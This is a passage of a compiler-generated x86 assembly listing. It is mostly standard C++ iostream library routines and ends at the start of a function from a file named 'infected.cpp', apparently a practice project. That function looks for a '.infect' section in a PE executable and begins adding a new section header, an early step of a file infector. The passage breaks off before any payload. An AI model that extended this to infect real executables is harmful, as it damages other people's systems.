  00080	8b 4d e4	 mov	 ecx, DWORD PTR tv89[ebp]
  00083	e8 00 00 00 00	 call	 ?sputc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAEHD@Z ; std::basic_streambuf<char,std::char_traits<char> >::sputc
  00088	89 45 e0	 mov	 DWORD PTR tv128[ebp], eax
  0008b	e8 00 00 00 00	 call	 ?eof@?$_Narrow_char_traits@DH@std@@SAHXZ ; std::_Narrow_char_traits<char,int>::eof
  00090	89 45 dc	 mov	 DWORD PTR tv94[ebp], eax
  00093	8b 4d e0	 mov	 ecx, DWORD PTR tv128[ebp]
  00096	51		 push	 ecx
  00097	8b 55 dc	 mov	 edx, DWORD PTR tv94[ebp]
  0009a	52		 push	 edx
  0009b	e8 00 00 00 00	 call	 ?eq_int_type@?$_Narrow_char_traits@DH@std@@SA_NHH@Z ; std::_Narrow_char_traits<char,int>::eq_int_type
  000a0	83 c4 08	 add	 esp, 8
  000a3	0f b6 c0	 movzx	 eax, al
  000a6	85 c0		 test	 eax, eax
  000a8	74 09		 je	 SHORT $LN5@put

; 532  :                 _State |= ios_base::badbit;

  000aa	8b 4d e8	 mov	 ecx, DWORD PTR __State$[ebp]
  000ad	83 c9 04	 or	 ecx, 4
  000b0	89 4d e8	 mov	 DWORD PTR __State$[ebp], ecx
$LN5@put:
  000b3	eb 20		 jmp	 SHORT $LN7@put
__catch$?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@D@Z$0:

; 533  :             }
; 534  :             _CATCH_IO_END

  000b5	8b 55 ec	 mov	 edx, DWORD PTR _this$[ebp]
  000b8	8b 02		 mov	 eax, DWORD PTR [edx]
  000ba	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  000bd	03 48 04	 add	 ecx, DWORD PTR [eax+4]
  000c0	89 4d d8	 mov	 DWORD PTR tv145[ebp], ecx
  000c3	6a 01		 push	 1
  000c5	6a 04		 push	 4
  000c7	8b 4d d8	 mov	 ecx, DWORD PTR tv145[ebp]
  000ca	e8 00 00 00 00	 call	 ?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QAEXH_N@Z ; std::basic_ios<char,std::char_traits<char> >::setstate
  000cf	b8 00 00 00 00	 mov	 eax, $LN10@put
  000d4	c3		 ret	 0
$LN7@put:
  000d5	c7 45 fc ff ff
	ff ff		 mov	 DWORD PTR __$EHRec$[ebp+12], -1
  000dc	eb 07		 jmp	 SHORT $LN9@put
$LN10@put:
  000de	c7 45 fc ff ff
	ff ff		 mov	 DWORD PTR __$EHRec$[ebp+12], -1
$LN9@put:

; 535  :         }
; 536  : 
; 537  :         _Myios::setstate(_State);

  000e5	8b 55 ec	 mov	 edx, DWORD PTR _this$[ebp]
  000e8	8b 02		 mov	 eax, DWORD PTR [edx]
  000ea	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  000ed	03 48 04	 add	 ecx, DWORD PTR [eax+4]
  000f0	89 4d d4	 mov	 DWORD PTR tv159[ebp], ecx
  000f3	6a 00		 push	 0
  000f5	8b 55 e8	 mov	 edx, DWORD PTR __State$[ebp]
  000f8	52		 push	 edx
  000f9	8b 4d d4	 mov	 ecx, DWORD PTR tv159[ebp]
  000fc	e8 00 00 00 00	 call	 ?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QAEXH_N@Z ; std::basic_ios<char,std::char_traits<char> >::setstate

; 538  :         return *this;

  00101	8b 45 ec	 mov	 eax, DWORD PTR _this$[ebp]
  00104	89 45 d0	 mov	 DWORD PTR $T2[ebp], eax
  00107	8d 4d c8	 lea	 ecx, DWORD PTR __Ok$[ebp]
  0010a	e8 00 00 00 00	 call	 ??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@XZ ; std::basic_ostream<char,std::char_traits<char> >::sentry::~sentry
  0010f	8b 45 d0	 mov	 eax, DWORD PTR $T2[ebp]

; 539  :     }

  00112	8b 4d f4	 mov	 ecx, DWORD PTR __$EHRec$[ebp+4]
  00115	64 89 0d 00 00
	00 00		 mov	 DWORD PTR fs:0, ecx
  0011c	59		 pop	 ecx
  0011d	5f		 pop	 edi
  0011e	5e		 pop	 esi
  0011f	5b		 pop	 ebx
  00120	8b e5		 mov	 esp, ebp
  00122	5d		 pop	 ebp
  00123	c2 04 00	 ret	 4
  00126	cc		 int	 3
  00127	cc		 int	 3
  00128	cc		 int	 3
  00129	cc		 int	 3
  0012a	cc		 int	 3
_TEXT	ENDS
;	COMDAT text$x
text$x	SEGMENT
__ehhandler$?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@D@Z:
  00000	90		 npad	 1
  00001	90		 npad	 1
  00002	8b 54 24 08	 mov	 edx, DWORD PTR [esp+8]
  00006	8d 42 0c	 lea	 eax, DWORD PTR [edx+12]
  00009	8b 4a c4	 mov	 ecx, DWORD PTR [edx-60]
  0000c	33 c8		 xor	 ecx, eax
  0000e	e8 00 00 00 00	 call	 @__security_check_cookie@4
  00013	b8 00 00 00 00	 mov	 eax, OFFSET __ehfuncinfo$?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@D@Z
  00018	e9 00 00 00 00	 jmp	 ___CxxFrameHandler3
text$x	ENDS
?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@D@Z ENDP ; std::basic_ostream<char,std::char_traits<char> >::put
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\ostream
;	COMDAT ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z
_TEXT	SEGMENT
tv67 = -8						; size = 4
_this$ = -4						; size = 4
__Pfn$ = 8						; size = 4
??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z PROC ; std::basic_ostream<char,std::char_traits<char> >::operator<<, COMDAT
; _this$ = ecx

; 189  :     basic_ostream& __CLR_OR_THIS_CALL operator<<(basic_ostream&(__cdecl* _Pfn)(basic_ostream&) ) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 190  :         // call basic_ostream manipulator
; 191  :         return _Pfn(*this);

  00009	8b 45 08	 mov	 eax, DWORD PTR __Pfn$[ebp]
  0000c	89 45 f8	 mov	 DWORD PTR tv67[ebp], eax
  0000f	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00012	51		 push	 ecx
  00013	ff 55 f8	 call	 DWORD PTR tv67[ebp]
  00016	83 c4 04	 add	 esp, 4

; 192  :     }

  00019	8b e5		 mov	 esp, ebp
  0001b	5d		 pop	 ebp
  0001c	c2 04 00	 ret	 4
??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z ENDP ; std::basic_ostream<char,std::char_traits<char> >::operator<<
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\ostream
;	COMDAT ?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEXXZ
_TEXT	SEGMENT
tv149 = -24						; size = 4
_this$ = -20						; size = 4
__$EHRec$ = -16						; size = 16
?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEXXZ PROC ; std::basic_ostream<char,std::char_traits<char> >::_Osfx, COMDAT
; _this$ = ecx

; 159  :     void __CLR_OR_THIS_CALL _Osfx() noexcept { // perform any wrapup

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	6a ff		 push	 -1
  00005	68 00 00 00 00	 push	 __ehhandler$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEXXZ
  0000a	64 a1 00 00 00
	00		 mov	 eax, DWORD PTR fs:0
  00010	50		 push	 eax
  00011	51		 push	 ecx
  00012	83 ec 08	 sub	 esp, 8
  00015	53		 push	 ebx
  00016	56		 push	 esi
  00017	57		 push	 edi
  00018	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0001d	33 c5		 xor	 eax, ebp
  0001f	50		 push	 eax
  00020	8d 45 f4	 lea	 eax, DWORD PTR __$EHRec$[ebp+4]
  00023	64 a3 00 00 00
	00		 mov	 DWORD PTR fs:0, eax
  00029	89 65 f0	 mov	 DWORD PTR __$EHRec$[ebp], esp
  0002c	89 4d ec	 mov	 DWORD PTR _this$[ebp], ecx

; 160  :         _TRY_BEGIN

  0002f	c7 45 fc 00 00
	00 00		 mov	 DWORD PTR __$EHRec$[ebp+12], 0

; 161  :         if (this->good() && this->flags() & ios_base::unitbuf) {

  00036	8b 45 ec	 mov	 eax, DWORD PTR _this$[ebp]
  00039	8b 08		 mov	 ecx, DWORD PTR [eax]
  0003b	8b 55 ec	 mov	 edx, DWORD PTR _this$[ebp]
  0003e	03 51 04	 add	 edx, DWORD PTR [ecx+4]
  00041	8b ca		 mov	 ecx, edx
  00043	e8 00 00 00 00	 call	 ?good@ios_base@std@@QBE_NXZ ; std::ios_base::good
  00048	0f b6 c0	 movzx	 eax, al
  0004b	85 c0		 test	 eax, eax
  0004d	74 4d		 je	 SHORT $LN4@Osfx
  0004f	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  00052	8b 11		 mov	 edx, DWORD PTR [ecx]
  00054	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  00057	03 4a 04	 add	 ecx, DWORD PTR [edx+4]
  0005a	e8 00 00 00 00	 call	 ?flags@ios_base@std@@QBEHXZ ; std::ios_base::flags
  0005f	83 e0 02	 and	 eax, 2
  00062	74 38		 je	 SHORT $LN4@Osfx

; 162  :             if (_Myios::rdbuf()->pubsync() == -1) { // flush stream as needed

  00064	8b 45 ec	 mov	 eax, DWORD PTR _this$[ebp]
  00067	8b 08		 mov	 ecx, DWORD PTR [eax]
  00069	8b 55 ec	 mov	 edx, DWORD PTR _this$[ebp]
  0006c	03 51 04	 add	 edx, DWORD PTR [ecx+4]
  0006f	8b ca		 mov	 ecx, edx
  00071	e8 00 00 00 00	 call	 ?rdbuf@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEPAV?$basic_streambuf@DU?$char_traits@D@std@@@2@XZ ; std::basic_ios<char,std::char_traits<char> >::rdbuf
  00076	8b c8		 mov	 ecx, eax
  00078	e8 00 00 00 00	 call	 ?pubsync@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAEHXZ ; std::basic_streambuf<char,std::char_traits<char> >::pubsync
  0007d	83 f8 ff	 cmp	 eax, -1
  00080	75 1a		 jne	 SHORT $LN4@Osfx

; 163  :                 _Myios::setstate(ios_base::badbit);

  00082	8b 45 ec	 mov	 eax, DWORD PTR _this$[ebp]
  00085	8b 08		 mov	 ecx, DWORD PTR [eax]
  00087	8b 55 ec	 mov	 edx, DWORD PTR _this$[ebp]
  0008a	03 51 04	 add	 edx, DWORD PTR [ecx+4]
  0008d	89 55 e8	 mov	 DWORD PTR tv149[ebp], edx
  00090	6a 00		 push	 0
  00092	6a 04		 push	 4
  00094	8b 4d e8	 mov	 ecx, DWORD PTR tv149[ebp]
  00097	e8 00 00 00 00	 call	 ?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QAEXH_N@Z ; std::basic_ios<char,std::char_traits<char> >::setstate
$LN4@Osfx:
  0009c	eb 06		 jmp	 SHORT $LN6@Osfx
__catch$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEXXZ$0:

; 164  :             }
; 165  :         }
; 166  :         _CATCH_ALL
; 167  :         _CATCH_END

  0009e	b8 00 00 00 00	 mov	 eax, $LN9@Osfx
  000a3	c3		 ret	 0
$LN6@Osfx:
  000a4	c7 45 fc ff ff
	ff ff		 mov	 DWORD PTR __$EHRec$[ebp+12], -1
  000ab	eb 07		 jmp	 SHORT $LN8@Osfx
$LN9@Osfx:
  000ad	c7 45 fc ff ff
	ff ff		 mov	 DWORD PTR __$EHRec$[ebp+12], -1
$LN8@Osfx:

; 168  :     }

  000b4	8b 4d f4	 mov	 ecx, DWORD PTR __$EHRec$[ebp+4]
  000b7	64 89 0d 00 00
	00 00		 mov	 DWORD PTR fs:0, ecx
  000be	59		 pop	 ecx
  000bf	5f		 pop	 edi
  000c0	5e		 pop	 esi
  000c1	5b		 pop	 ebx
  000c2	8b e5		 mov	 esp, ebp
  000c4	5d		 pop	 ebp
  000c5	c3		 ret	 0
  000c6	cc		 int	 3
  000c7	cc		 int	 3
  000c8	cc		 int	 3
  000c9	cc		 int	 3
  000ca	cc		 int	 3
_TEXT	ENDS
;	COMDAT text$x
text$x	SEGMENT
__ehhandler$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEXXZ:
  00000	90		 npad	 1
  00001	90		 npad	 1
  00002	8b 54 24 08	 mov	 edx, DWORD PTR [esp+8]
  00006	8d 42 0c	 lea	 eax, DWORD PTR [edx+12]
  00009	8b 4a e4	 mov	 ecx, DWORD PTR [edx-28]
  0000c	33 c8		 xor	 ecx, eax
  0000e	e8 00 00 00 00	 call	 @__security_check_cookie@4
  00013	b8 00 00 00 00	 mov	 eax, OFFSET __ehfuncinfo$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEXXZ
  00018	e9 00 00 00 00	 jmp	 ___CxxFrameHandler3
text$x	ENDS
?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEXXZ ENDP ; std::basic_ostream<char,std::char_traits<char> >::_Osfx
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\ios
;	COMDAT ?widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEDD@Z
_TEXT	SEGMENT
$T1 = -20						; size = 8
tv79 = -12						; size = 4
_this$ = -8						; size = 4
$T2 = -1						; size = 1
__Byte$ = 8						; size = 1
?widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEDD@Z PROC ; std::basic_ios<char,std::char_traits<char> >::widen, COMDAT
; _this$ = ecx

; 112  :     _Elem __CLR_OR_THIS_CALL widen(char _Byte) const { // convert _Byte to character using imbued locale

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 14	 sub	 esp, 20			; 00000014H
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 113  :         return _STD use_facet<_Ctype>(getloc()).widen(_Byte);

  00009	8d 45 ec	 lea	 eax, DWORD PTR $T1[ebp]
  0000c	50		 push	 eax
  0000d	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00010	e8 00 00 00 00	 call	 ?getloc@ios_base@std@@QBE?AVlocale@2@XZ ; std::ios_base::getloc
  00015	50		 push	 eax
  00016	e8 00 00 00 00	 call	 ??$use_facet@V?$ctype@D@std@@@std@@YAABV?$ctype@D@0@ABVlocale@0@@Z ; std::use_facet<std::ctype<char> >
  0001b	83 c4 04	 add	 esp, 4
  0001e	89 45 f4	 mov	 DWORD PTR tv79[ebp], eax
  00021	0f b6 4d 08	 movzx	 ecx, BYTE PTR __Byte$[ebp]
  00025	51		 push	 ecx
  00026	8b 4d f4	 mov	 ecx, DWORD PTR tv79[ebp]
  00029	e8 00 00 00 00	 call	 ?widen@?$ctype@D@std@@QBEDD@Z ; std::ctype<char>::widen
  0002e	88 45 ff	 mov	 BYTE PTR $T2[ebp], al
  00031	8d 4d ec	 lea	 ecx, DWORD PTR $T1[ebp]
  00034	e8 00 00 00 00	 call	 ??1locale@std@@QAE@XZ	; std::locale::~locale
  00039	0f b6 45 ff	 movzx	 eax, BYTE PTR $T2[ebp]

; 114  :     }

  0003d	8b e5		 mov	 esp, ebp
  0003f	5d		 pop	 ebp
  00040	c2 04 00	 ret	 4
?widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEDD@Z ENDP ; std::basic_ios<char,std::char_traits<char> >::widen
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\ios
;	COMDAT ?fill@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEDXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?fill@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEDXZ PROC ; std::basic_ios<char,std::char_traits<char> >::fill, COMDAT
; _this$ = ecx

; 98   :     _Elem __CLR_OR_THIS_CALL fill() const noexcept /* strengthened */ {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 99   :         return _Fillch;

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	0f b6 40 40	 movzx	 eax, BYTE PTR [eax+64]

; 100  :     }

  0000e	8b e5		 mov	 esp, ebp
  00010	5d		 pop	 ebp
  00011	c3		 ret	 0
?fill@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEDXZ ENDP ; std::basic_ios<char,std::char_traits<char> >::fill
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\ios
;	COMDAT ?rdbuf@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEPAV?$basic_streambuf@DU?$char_traits@D@std@@@2@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?rdbuf@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEPAV?$basic_streambuf@DU?$char_traits@D@std@@@2@XZ PROC ; std::basic_ios<char,std::char_traits<char> >::rdbuf, COMDAT
; _this$ = ecx

; 77   :     _NODISCARD _Mysb* __CLR_OR_THIS_CALL rdbuf() const noexcept /* strengthened */ {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 78   :         return _Mystrbuf;

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b 40 38	 mov	 eax, DWORD PTR [eax+56]

; 79   :     }

  0000d	8b e5		 mov	 esp, ebp
  0000f	5d		 pop	 ebp
  00010	c3		 ret	 0
?rdbuf@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEPAV?$basic_streambuf@DU?$char_traits@D@std@@@2@XZ ENDP ; std::basic_ios<char,std::char_traits<char> >::rdbuf
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\ios
;	COMDAT ?tie@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEPAV?$basic_ostream@DU?$char_traits@D@std@@@2@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?tie@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEPAV?$basic_ostream@DU?$char_traits@D@std@@@2@XZ PROC ; std::basic_ios<char,std::char_traits<char> >::tie, COMDAT
; _this$ = ecx

; 67   :     _Myos* __CLR_OR_THIS_CALL tie() const noexcept /* strengthened */ {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 68   :         return _Tiestr;

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b 40 3c	 mov	 eax, DWORD PTR [eax+60]

; 69   :     }

  0000d	8b e5		 mov	 esp, ebp
  0000f	5d		 pop	 ebp
  00010	c3		 ret	 0
?tie@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEPAV?$basic_ostream@DU?$char_traits@D@std@@@2@XZ ENDP ; std::basic_ios<char,std::char_traits<char> >::tie
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\ios
;	COMDAT ?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QAEXH_N@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__State$ = 8						; size = 4
__Reraise$ = 12						; size = 1
?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QAEXH_N@Z PROC ; std::basic_ios<char,std::char_traits<char> >::setstate, COMDAT
; _this$ = ecx

; 49   :     void __CLR_OR_THIS_CALL setstate(iostate _State, bool _Reraise = false) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 50   :         // merge _State into state, possibly reraise exception
; 51   :         clear(rdstate() | _State, _Reraise);

  00007	0f b6 45 0c	 movzx	 eax, BYTE PTR __Reraise$[ebp]
  0000b	50		 push	 eax
  0000c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000f	e8 00 00 00 00	 call	 ?rdstate@ios_base@std@@QBEHXZ ; std::ios_base::rdstate
  00014	0b 45 08	 or	 eax, DWORD PTR __State$[ebp]
  00017	50		 push	 eax
  00018	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001b	e8 00 00 00 00	 call	 ?clear@?$basic_ios@DU?$char_traits@D@std@@@std@@QAEXH_N@Z ; std::basic_ios<char,std::char_traits<char> >::clear

; 52   :     }

  00020	8b e5		 mov	 esp, ebp
  00022	5d		 pop	 ebp
  00023	c2 08 00	 ret	 8
?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QAEXH_N@Z ENDP ; std::basic_ios<char,std::char_traits<char> >::setstate
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\ios
;	COMDAT ?clear@?$basic_ios@DU?$char_traits@D@std@@@std@@QAEXH_N@Z
_TEXT	SEGMENT
_this$ = -12						; size = 4
tv72 = -8						; size = 4
tv76 = -1						; size = 1
__State$ = 8						; size = 4
__Reraise$ = 12						; size = 1
?clear@?$basic_ios@DU?$char_traits@D@std@@@std@@QAEXH_N@Z PROC ; std::basic_ios<char,std::char_traits<char> >::clear, COMDAT
; _this$ = ecx

; 38   :     void __CLR_OR_THIS_CALL clear(iostate _State = goodbit, bool _Reraise = false) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 0c	 sub	 esp, 12			; 0000000cH
  00006	89 4d f4	 mov	 DWORD PTR _this$[ebp], ecx

; 39   :         // set state, possibly reraise exception
; 40   :         ios_base::clear(_State | (_Mystrbuf ? ios_base::goodbit : ios_base::badbit), _Reraise);

  00009	8a 45 0c	 mov	 al, BYTE PTR __Reraise$[ebp]
  0000c	88 45 ff	 mov	 BYTE PTR tv76[ebp], al
  0000f	8b 4d f4	 mov	 ecx, DWORD PTR _this$[ebp]
  00012	83 79 38 00	 cmp	 DWORD PTR [ecx+56], 0
  00016	74 09		 je	 SHORT $LN3@clear
  00018	c7 45 f8 00 00
	00 00		 mov	 DWORD PTR tv72[ebp], 0
  0001f	eb 07		 jmp	 SHORT $LN4@clear
$LN3@clear:
  00021	c7 45 f8 04 00
	00 00		 mov	 DWORD PTR tv72[ebp], 4
$LN4@clear:
  00028	8b 55 08	 mov	 edx, DWORD PTR __State$[ebp]
  0002b	0b 55 f8	 or	 edx, DWORD PTR tv72[ebp]
  0002e	0f b6 45 ff	 movzx	 eax, BYTE PTR tv76[ebp]
  00032	50		 push	 eax
  00033	52		 push	 edx
  00034	8b 4d f4	 mov	 ecx, DWORD PTR _this$[ebp]
  00037	e8 00 00 00 00	 call	 ?clear@ios_base@std@@QAEXH_N@Z ; std::ios_base::clear

; 41   :     }

  0003c	8b e5		 mov	 esp, ebp
  0003e	5d		 pop	 ebp
  0003f	c2 08 00	 ret	 8
?clear@?$basic_ios@DU?$char_traits@D@std@@@std@@QAEXH_N@Z ENDP ; std::basic_ios<char,std::char_traits<char> >::clear
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\masm32\Code\ASMPractice\demo1\demo3\infected.cpp
_TEXT	SEGMENT
tv93 = -32						; size = 4
_currentSection$1 = -28					; size = 4
_order$2 = -24						; size = 4
_pSectionHeader$ = -20					; size = 4
_sectionCount$ = -16					; size = 2
_sectionName$ = -12					; size = 8
__$ArrayPad$ = -4					; size = 4
_hFile$ = 8						; size = 4
_pNtHeader$ = 12					; size = 4
_pByte$ = 16						; size = 4
_fileSize$ = 20						; size = 4
_bytesWritten$ = 24					; size = 4
_sizeOfSection$ = 28					; size = 4
?CreateNewSection@@YA_NAAPAXAAPAU_IMAGE_NT_HEADERS@@PAEAAK3K@Z PROC ; CreateNewSection

; 24   : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 20	 sub	 esp, 32			; 00000020H
  00006	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0000b	33 c5		 xor	 eax, ebp
  0000d	89 45 fc	 mov	 DWORD PTR __$ArrayPad$[ebp], eax

; 25   :      
; 26   :     PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeader);

  00010	8b 45 0c	 mov	 eax, DWORD PTR _pNtHeader$[ebp]
  00013	8b 08		 mov	 ecx, DWORD PTR [eax]
  00015	8b 55 0c	 mov	 edx, DWORD PTR _pNtHeader$[ebp]
  00018	8b 02		 mov	 eax, DWORD PTR [edx]
  0001a	0f b7 50 14	 movzx	 edx, WORD PTR [eax+20]
  0001e	8d 44 11 18	 lea	 eax, DWORD PTR [ecx+edx+24]
  00022	89 45 ec	 mov	 DWORD PTR _pSectionHeader$[ebp], eax

; 27   :     WORD sectionCount = pNtHeader->FileHeader.NumberOfSections;

  00025	8b 4d 0c	 mov	 ecx, DWORD PTR _pNtHeader$[ebp]
  00028	8b 11		 mov	 edx, DWORD PTR [ecx]
  0002a	66 8b 42 06	 mov	 ax, WORD PTR [edx+6]
  0002e	66 89 45 f0	 mov	 WORD PTR _sectionCount$[ebp], ax

; 28   :     const char sectionName[] = ".infect";

  00032	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR $SG147748
  00038	8b 15 04 00 00
	00		 mov	 edx, DWORD PTR $SG147748+4
  0003e	89 4d f4	 mov	 DWORD PTR _sectionName$[ebp], ecx
  00041	89 55 f8	 mov	 DWORD PTR _sectionName$[ebp+4], edx

; 29   :     for (int order = 0; order < sectionCount; order++) {

  00044	c7 45 e8 00 00
	00 00		 mov	 DWORD PTR _order$2[ebp], 0
  0004b	eb 09		 jmp	 SHORT $LN4@CreateNewS
$LN2@CreateNewS:
  0004d	8b 45 e8	 mov	 eax, DWORD PTR _order$2[ebp]
  00050	83 c0 01	 add	 eax, 1
  00053	89 45 e8	 mov	 DWORD PTR _order$2[ebp], eax
$LN4@CreateNewS:
  00056	0f b7 4d f0	 movzx	 ecx, WORD PTR _sectionCount$[ebp]
  0005a	39 4d e8	 cmp	 DWORD PTR _order$2[ebp], ecx
  0005d	7d 55		 jge	 SHORT $LN3@CreateNewS

; 30   :         PIMAGE_SECTION_HEADER currentSection = pSectionHeader + order;

  0005f	6b 55 e8 28	 imul	 edx, DWORD PTR _order$2[ebp], 40
  00063	03 55 ec	 add	 edx, DWORD PTR _pSectionHeader$[ebp]
  00066	89 55 e4	 mov	 DWORD PTR _currentSection$1[ebp], edx

; 31   :         if (!strcmp((char*)currentSection->Name, sectionName)) {

  00069	8d 45 f4	 lea	 eax, DWORD PTR _sectionName$[ebp]
  0006c	50		 push	 eax
  0006d	8b 4d e4	 mov	 ecx, DWORD PTR _currentSection$1[ebp]
  00070	51		 push	 ecx
  00071	e8 00 00 00 00	 call	 _strcmp
  00076	83 c4 08	 add	 esp, 8
  00079	85 c0		 test	 eax, eax
  0007b	75 35		 jne	 SHORT $LN5@CreateNewS

; 32   :             cerr << "PE section already exists" << endl;

  0007d	68 00 00 00 00	 push	 OFFSET $SG147750
  00082	68 00 00 00 00	 push	 OFFSET ?cerr@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::cerr
  00087	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  0008c	83 c4 08	 add	 esp, 8
  0008f	89 45 e0	 mov	 DWORD PTR tv93[ebp], eax
  00092	68 00 00 00 00	 push	 OFFSET ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
  00097	8b 4d e0	 mov	 ecx, DWORD PTR tv93[ebp]
  0009a	e8 00 00 00 00	 call	 ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<

; 33   :             CloseHandle(hFile);

  0009f	8b 55 08	 mov	 edx, DWORD PTR _hFile$[ebp]
  000a2	8b 02		 mov	 eax, DWORD PTR [edx]
  000a4	50		 push	 eax
  000a5	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__CloseHandle@4

; 34   :             return false;

  000ab	32 c0		 xor	 al, al
  000ad	e9 b7 01 00 00	 jmp	 $LN1@CreateNewS
$LN5@CreateNewS:

; 35   :         }
; 36   :     } 

  000b2	eb 99		 jmp	 SHORT $LN2@CreateNewS
$LN3@CreateNewS:

; 37   :     ZeroMemory(&pSectionHeader[sectionCount], sizeof(IMAGE_SECTION_HEADER));

  000b4	6a 28		 push	 40			; 00000028H
  000b6	6a 00		 push	 0
  000b8	0f b7 4d f0	 movzx	 ecx, WORD PTR _sectionCount$[ebp]
